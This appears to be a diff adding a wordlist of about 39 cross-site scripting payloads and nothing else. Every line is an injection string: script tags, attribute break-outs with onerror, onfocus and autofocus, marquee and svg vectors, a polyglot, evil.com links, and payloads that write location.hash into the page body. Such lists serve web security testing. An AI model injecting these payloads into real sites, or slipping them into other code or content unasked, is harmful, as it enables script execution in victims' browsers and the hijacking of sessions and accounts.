@@ -1,0 +1,39 @@
+<script>alert(1)</script>
+</ScrIpt><script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+' '><script>alert(1)</script>
+" onerror=alert(1); "
+' onerror=alert(1); '
+" onfocus="alert(1)"  autofocus="true"
+' onfocus="alert(1)"  autofocus="true"
+<marquee/onstart=confirm(1)>
+"><marquee/onstart=confirm(1)>
+'><marquee/onstart=confirm(1)>
+<img src=x onerror=prompt(1);>
+"><img src=x onerror=prompt(1);>
+'><img src=x onerror=prompt(1);>
+"><SCRIPT>+alert("X");</SCRIPT>
+'><SCRIPT>+alert("X");</SCRIPT>
+javascript://'/</title></style></textarea></script>-- ><p"%0Aonclick=alert()//>*/aler()/*
+<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+ "><svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+'><svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+"><math><a xlink:href="//evil.com/">click
+'><math><a xlink:href="//evil.com/">click
+"><script padding>/*<script* */alert(1)</script padding>
+'><script padding>/*<script* */alert(1)</script padding>
+<img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
+"><img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
+'><img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
+"><img src=x onerror=prompt(1)>
+'><img src=x onerror=prompt(1)>
+<img src=x onerror=document.body.innerHTML=location.hash>#"><img/src ='x'onerror=prompt(1)>
+ "><img src=x onerror=document.body.innerHTML=location.hash>#"><img/src ='x'onerror=prompt(1)>
+'><img src=x onerror=document.body.innerHTML=location.hash>#"><img/src ='x'onerror=prompt(1)>
+ <img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
+"><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
+'><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
+ <svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
+"><svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
+'><svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
